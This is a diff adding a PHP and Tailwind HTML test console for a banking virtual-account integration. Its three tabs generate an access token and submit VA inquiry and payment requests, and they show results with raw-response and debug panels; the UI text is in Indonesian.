+    <button onclick="showTab('token')"   id="tab-token"   class="tab-btn px-4 py-2 rounded-lg text-sm font-medium <?= $uiAction==='token'  ?'active':'' ?>">
+      <i class="fas fa-key mr-1"></i>Token
+    </button>
+    <button onclick="showTab('inquiry')" id="tab-inquiry" class="tab-btn px-4 py-2 rounded-lg text-sm font-medium <?= $uiAction==='inquiry'?'active':'' ?>">
+      <i class="fas fa-search-dollar mr-1"></i>Inquiry
+    </button>
+    <button onclick="showTab('payment')" id="tab-payment" class="tab-btn px-4 py-2 rounded-lg text-sm font-medium <?= $uiAction==='payment'?'active':'' ?>">
+      <i class="fas fa-money-bill-wave mr-1"></i>Payment
+    </button>
+  </div>
+</div>
+
+<!-- Error global -->
+<?php if ($uiError): ?>
+<div class="max-w-3xl mx-auto mb-4 p-4 bg-red-50 border border-red-200 rounded-lg text-red-700 text-sm">
+  <i class="fas fa-exclamation-triangle mr-2"></i><?= htmlspecialchars($uiError) ?>
+</div>
+<?php endif; ?>
+
+<!-- ====== TAB: TOKEN ====== -->
+<div id="pane-token" class="max-w-3xl mx-auto <?= $uiAction!=='token'?'hidden':'' ?>">
+  <div class="card p-6">
+    <h2 class="text-base font-semibold text-gray-700 mb-4"><i class="fas fa-key text-blue-500 mr-2"></i>Generate Access Token</h2>
+    <div class="result-box mb-4 text-sm text-gray-600">
+      <div><strong>Endpoint:</strong> <code class="text-blue-700"><?= htmlspecialchars(URL_TOKEN) ?></code></div>
+      <div class="mt-1"><strong>Catatan:</strong> Server hanya cek <code>x-client-key</code> di DB. Token berlaku <strong>900 detik</strong> (15 menit).</div>
+    </div>
+    <form method="POST">
+      <input type="hidden" name="action" value="token">
+      <button type="submit" class="w-full py-2.5 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg transition">
+        <i class="fas fa-bolt mr-2"></i>Generate Token Sekarang
+      </button>
+    </form>
+
+    <?php if ($uiAction === 'token' && $uiResult): ?>
+    <div class="mt-5">
+      <div class="flex items-center gap-3 mb-3">
+        <?= badge($uiResult['success']) ?>
+        <span class="text-sm">HTTP <?= $uiResult['http_code'] ?></span>
+        <?= rcBadge($uiResult['response_code'] ?? '') ?>
+      </div>
+      <?php if ($uiResult['success']): ?>
+      <div class="grid grid-cols-2 gap-3 mb-3">
+        <div class="result-box">
+          <div class="text-xs text-gray-500 mb-1">Access Token</div>
+          <code class="text-sm text-green-700 break-all font-bold"><?= htmlspecialchars($uiResult['access_token']) ?></code>
+        </div>
+        <div class="result-box">
+          <div class="text-xs text-gray-500 mb-1">Berlaku</div>
+          <span class="text-sm font-bold text-gray-700"><?= $uiResult['expires_in'] ?> detik</span>
+          <span class="text-xs text-gray-400 ml-1">(~<?= round($uiResult['expires_in']/60) ?> menit)</span>
+        </div>
+      </div>
+      <?php else: ?>
+      <div class="p-3 bg-red-50 border border-red-200 rounded-lg text-red-700 text-sm mb-3">
+        <i class="fas fa-times-circle mr-1"></i><?= htmlspecialchars($uiResult['error']) ?>
+        <?php if (!empty($uiResult['debug']['note'])): ?>
+        <div class="mt-1 text-xs text-red-500"><?= htmlspecialchars($uiResult['debug']['note']) ?></div>
+        <?php endif; ?>
+      </div>
+      <?php endif; ?>
+      <details class="mt-2">
+        <summary class="text-xs text-gray-400 cursor-pointer hover:text-gray-600">Raw Response &amp; Debug</summary>
+        <div class="mt-2 result-box text-xs">
+          <div class="font-semibold text-gray-500 mb-1">Raw Response:</div>
+          <?= prettyJson($uiResult['raw'] ?? '') ?>
+          <div class="font-semibold text-gray-500 mt-3 mb-1">Debug:</div>
+          <?php foreach ($uiResult['debug'] as $k => $v): ?>
+          <div class="mb-0.5"><span class="font-mono text-blue-600"><?= $k ?>:</span> <span class="break-all"><?= htmlspecialchars((string)$v) ?></span></div>
+          <?php endforeach; ?>
+        </div>
+      </details>
+    </div>
+    <?php endif; ?>
+  </div>
+</div>
+
+<!-- ====== TAB: INQUIRY ====== -->
+<div id="pane-inquiry" class="max-w-3xl mx-auto <?= $uiAction!=='inquiry'?'hidden':'' ?>">
+  <div class="card p-6">
+    <h2 class="text-base font-semibold text-gray-700 mb-1"><i class="fas fa-search-dollar text-indigo-500 mr-2"></i>VA Inquiry</h2>
+    <p class="text-xs text-gray-400 mb-4">Token diambil <strong>otomatis</strong> — tidak perlu generate manual.</p>
+    <div class="result-box mb-4 text-sm text-gray-600">
+      <div><strong>Endpoint:</strong> <code class="text-indigo-700"><?= htmlspecialchars(URL_INQUIRY) ?></code></div>
+    </div>
+
+    <form method="POST" class="space-y-3">
+      <input type="hidden" name="action" value="inquiry">
+      <div class="grid grid-cols-2 gap-3">
+        <div>
+          <label class="block text-xs font-medium text-gray-600 mb-1">BIN / partnerServiceId</label>
+          <input type="text" name="bin" value="<?= htmlspecialchars($_POST['bin'] ?? SNAP_BIN) ?>"
+                 class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm" placeholder="<?= SNAP_BIN ?>">
+          <p class="text-xs text-gray-400 mt-0.5">Akan di-pad kiri jadi 8 karakter</p>
+        </div>
+        <div>
+          <label class="block text-xs font-medium text-gray-600 mb-1">Customer No <span class="text-red-500">*</span></label>
+          <input type="text" name="cust" value="<?= htmlspecialchars($_POST['cust'] ?? '') ?>"
+                 class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm" placeholder="12–16 digit numerik" required>
+        </div>
+      </div>
+      <div>
+        <label class="block text-xs font-medium text-gray-600 mb-1">Virtual Account No <span class="text-red-500">*</span></label>
+        <input type="text" name="vano" value="<?= htmlspecialchars($_POST['vano'] ?? '') ?>"
+               class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm" placeholder="<?= SNAP_BIN ?>xxxxxxxx (12–16 digit)" required>
+      </div>
+      <div>
+        <label class="block text-xs font-medium text-gray-600 mb-1">Inquiry Request ID <span class="text-gray-400">(opsional, auto-generate jika kosong)</span></label>
+        <input type="text" name="reqid" value="<?= htmlspecialchars($_POST['reqid'] ?? '') ?>"
+               class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm" placeholder="UUID auto-generate">
+      </div>
+      <button type="submit" class="w-full py-2.5 bg-indigo-600 hover:bg-indigo-700 text-white font-semibold rounded-lg transition">
+        <i class="fas fa-search mr-2"></i>Kirim Inquiry
+      </button>
+    </form>
+
+    <?php if ($uiAction === 'inquiry' && $uiResult): ?>
+    <div class="mt-5">
+      <div class="flex items-center gap-3 mb-3 flex-wrap">
+        <?= badge($uiResult['success']) ?>
+        <span class="text-sm">HTTP <?= $uiResult['http_code'] ?></span>
+        <?= rcBadge($uiResult['response_code'] ?? '') ?>
+        <span class="text-xs text-gray-400">Token: <?= ($uiResult['token_from_cache'] ?? false) ? '♻ dari cache' : '🔄 baru fetch' ?></span>
+        <?php if (!empty($uiResult['access_token_used'])): ?>
+        <span class="text-xs font-mono text-gray-400"><?= htmlspecialchars(substr($uiResult['access_token_used'], 0, 20)) ?>…</span>
+        <?php endif; ?>
+      </div>
+
+      <?php if (!$uiResult['success']): ?>
+      <div class="p-3 bg-red-50 border border-red-200 rounded-lg text-red-700 text-sm mb-3">
+        <i class="fas fa-times-circle mr-1"></i><?= htmlspecialchars($uiResult['error']) ?>
+      </div>
+      <?php endif; ?>
+
+      <?php if (!empty($uiResult['virtual_account_data'])): ?>
+      <div class="result-box mb-3">
+        <div class="text-xs font-semibold text-gray-500 mb-2">Virtual Account Data</div>
+        <?php $va = $uiResult['virtual_account_data']; ?>
+        <div class="grid grid-cols-2 gap-2 text-sm">
+          <?php foreach (['name','totalAmount','partnerServiceId','customerNo','virtualAccountNo','billDetails'] as $f): ?>
+          <?php if (isset($va[$f])): ?>
+          <div>
+            <span class="text-xs text-gray-500"><?= $f ?>:</span>
+            <span class="font-medium text-gray-700">
+              <?= is_array($va[$f]) ? json_encode($va[$f], JSON_UNESCAPED_UNICODE) : htmlspecialchars((string)$va[$f]) ?>
+            </span>
+          </div>
+          <?php endif; ?>
+          <?php endforeach; ?>
+        </div>
+      </div>
+      <?php endif; ?>
+
+      <details>
+        <summary class="text-xs text-gray-400 cursor-pointer hover:text-gray-600">Raw Response &amp; Debug</summary>
+        <div class="mt-2 result-box text-xs">
+          <?= prettyJson($uiResult['raw'] ?? '') ?>
+          <div class="font-semibold text-gray-500 mt-3 mb-1">Debug:</div>
+          <?php foreach ($uiResult['debug'] as $k => $v): ?>
+          <div class="mb-0.5"><span class="font-mono text-indigo-600"><?= $k ?>:</span> <span class="break-all"><?= htmlspecialchars((string)$v) ?></span></div>
+          <?php endforeach; ?>
+        </div>
+      </details>
+    </div>
+    <?php endif; ?>
+  </div>
+</div>
+
+<!-- ====== TAB: PAYMENT ====== -->
+<div id="pane-payment" class="max-w-3xl mx-auto <?= $uiAction!=='payment'?'hidden':'' ?>">
+  <div class="card p-6">
+    <h2 class="text-base font-semibold text-gray-700 mb-1"><i class="fas fa-money-bill-wave text-emerald-500 mr-2"></i>VA Payment</h2>
+    <p class="text-xs text-gray-400 mb-4">Token diambil <strong>otomatis</strong> — tidak perlu generate manual.</p>
+    <div class="result-box mb-4 text-sm text-gray-600">
+      <div><strong>Endpoint:</strong> <code class="text-emerald-700"><?= htmlspecialchars(URL_PAYMENT) ?></code></div>
+    </div>
+
+    <form method="POST" class="space-y-3">
+      <input type="hidden" name="action" value="payment">
+      <div class="grid grid-cols-2 gap-3">
+        <div>
+          <label class="block text-xs font-medium text-gray-600 mb-1">BIN / partnerServiceId</label>
+          <input type="text" name="bin" value="<?= htmlspecialchars($_POST['bin'] ?? SNAP_BIN) ?>"
+                 class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm">
+        </div>
+        <div>
+          <label class="block text-xs font-medium text-gray-600 mb-1">Customer No <span class="text-red-500">*</span></label>
+          <input type="text" name="cust" value="<?= htmlspecialchars($_POST['cust'] ?? '') ?>"
+                 class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm" placeholder="12–16 digit numerik" required>
+        </div>
+      </div>
+      <div>
+        <label class="block text-xs font-medium text-gray-600 mb-1">Virtual Account No <span class="text-red-500">*</span></label>
+        <input type="text" name="vano" value="<?= htmlspecialchars($_POST['vano'] ?? '') ?>"
+               class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm" placeholder="12–16 digit" required>
+      </div>
+      <div class="grid grid-cols-3 gap-3">
+        <div>
+          <label class="block text-xs font-medium text-gray-600 mb-1">Paid Amount <span class="text-red-500">*</span></label>
+          <input type="number" name="paid" value="<?= htmlspecialchars($_POST['paid'] ?? '') ?>"
+                 class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm" placeholder="100000" min="1" required>
+        </div>
+        <div>
+          <label class="block text-xs font-medium text-gray-600 mb-1">Total Amount</label>
+          <input type="number" name="total" value="<?= htmlspecialchars($_POST['total'] ?? '') ?>"
+                 class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm" placeholder="= Paid Amount jika kosong">
+        </div>
+        <div>
+          <label class="block text-xs font-medium text-gray-600 mb-1">Currency</label>
+          <select name="currency" class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm">
+            <option value="IDR" <?= ($_POST['currency'] ?? 'IDR') === 'IDR' ? 'selected' : '' ?>>IDR</option>
+          </select>
+        </div>
+      </div>
+      <div>
+        <label class="block text-xs font-medium text-gray-600 mb-1">Payment Request ID <span class="text-gray-400">(opsional)</span></label>
+        <input type="text" name="reqid" value="<?= htmlspecialchars($_POST['reqid'] ?? '') ?>"
+               class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm" placeholder="UUID auto-generate">
+      </div>
+      <button type="submit" class="w-full py-2.5 bg-emerald-600 hover:bg-emerald-700 text-white font-semibold rounded-lg transition">
+        <i class="fas fa-paper-plane mr-2"></i>Kirim Payment
+      </button>
+    </form>
+
+    <?php if ($uiAction === 'payment' && $uiResult): ?>
+    <div class="mt-5">
+      <div class="flex items-center gap-3 mb-3 flex-wrap">
+        <?= badge($uiResult['success']) ?>
+        <span class="text-sm">HTTP <?= $uiResult['http_code'] ?></span>
+        <?= rcBadge($uiResult['response_code'] ?? '') ?>
+        <span class="text-xs text-gray-400">Token: <?= ($uiResult['token_from_cache'] ?? false) ? '♻ dari cache' : '🔄 baru fetch' ?></span>
+      </div>
+
+      <?php if (!$uiResult['success']): ?>
+      <div class="p-3 bg-red-50 border border-red-200 rounded-lg text-red-700 text-sm mb-3">
+        <i class="fas fa-times-circle mr-1"></i><?= htmlspecialchars($uiResult['error']) ?>
+      </div>
+      <?php endif; ?>
+
+      <?php if (!empty($uiResult['virtual_account_data'])): ?>
+      <div class="result-box mb-3">
+        <div class="text-xs font-semibold text-gray-500 mb-2">Payment Result</div>
+        <pre class="text-xs"><?= htmlspecialchars(json_encode($uiResult['virtual_account_data'], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)) ?></pre>
+      </div>
+      <?php endif; ?>
+
+      <details>
+        <summary class="text-xs text-gray-400 cursor-pointer hover:text-gray-600">Raw Response &amp; Debug</summary>
+        <div class="mt-2 result-box text-xs">
+          <?= prettyJson($uiResult['raw'] ?? '') ?>
+          <div class="font-semibold text-gray-500 mt-3 mb-1">Debug:</div>
+          <?php foreach ($uiResult['debug'] as $k => $v): ?>
+          <div class="mb-0.5"><span class="font-mono text-emerald-600"><?= $k ?>:</span> <span class="break-all"><?= htmlspecialchars((string)$v) ?></span></div>
+          <?php endforeach; ?>
+        </div>
+      </details>
+    </div>
+    <?php endif; ?>
+  </div>
+</div>
+
+<!-- Endpoint info -->
+<div class="max-w-3xl mx-auto mt-6">
+  <div class="card p-4">
+    <div class="text-xs font-semibold text-gray-500 mb-2"><i class="fas fa-link mr-1"></i>Endpoint Aktif</div>
+    <div class="space-y-1 text-xs font-mono">
+      <div><span class="inline-block w-20 text-gray-400">Token</span><span class="text-blue-600"><?= htmlspecialchars(URL_TOKEN) ?></span></div>
+      <div><span class="inline-block w-20 text-gray-400">Inquiry</span><span class="text-indigo-600"><?= htmlspecialchars(URL_INQUIRY) ?></span></div>
+      <div><span class="inline-block w-20 text-gray-400">Payment</span><span class="text-emerald-600"><?= htmlspecialchars(URL_PAYMENT) ?></span></div>
+    </div>
+  </div>
+</div>
+
+<div class="max-w-3xl mx-auto mt-3 text-center text-xs text-gray-400 pb-8">
+  permata-switching_v1.0_pro &mdash; <?= date('Y') ?>
+</div>
+
+<script>
+function showTab(name) {
+  ['token','inquiry','payment'].forEach(t => {
+    document.getElementById('pane-' + t).classList.add('hidden');
+    document.getElementById('tab-' + t).classList.remove('active');
+  });
+  document.getElementById('pane-' + name).classList.remove('hidden');
+  document.getElementById('tab-'  + name).classList.add('active');
+}
+// Auto-show active tab from PHP
+<?php if ($uiAction): ?>
+showTab('<?= htmlspecialchars($uiAction) ?>');
+<?php else: ?>
+showTab('token');
+<?php endif; ?>
+</script>
+</body>
+</html>
